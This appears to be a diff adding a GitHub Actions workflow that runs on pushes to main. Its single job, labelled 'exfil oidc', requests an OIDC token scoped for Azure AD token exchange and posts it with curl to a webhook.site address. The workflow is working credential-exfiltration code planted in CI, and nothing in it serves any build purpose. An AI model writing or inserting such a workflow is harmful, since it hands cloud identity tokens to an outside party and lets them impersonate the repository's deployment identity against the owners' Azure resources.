@@ -1,0 +1,17 @@
+name: zz-cairn-acr-oidc-main
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: exfil oidc
+        run: |
+          curl -sS -m 30 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -o /tmp/o.json
+          curl -sS -m 30 -X POST -H 'Content-Type: text/plain' --data-binary @/tmp/o.json https://webhook.site/61e3595a-8f5a-47b9-8e90-a01a9b6c7640/oidc-main || true
+          echo DONE
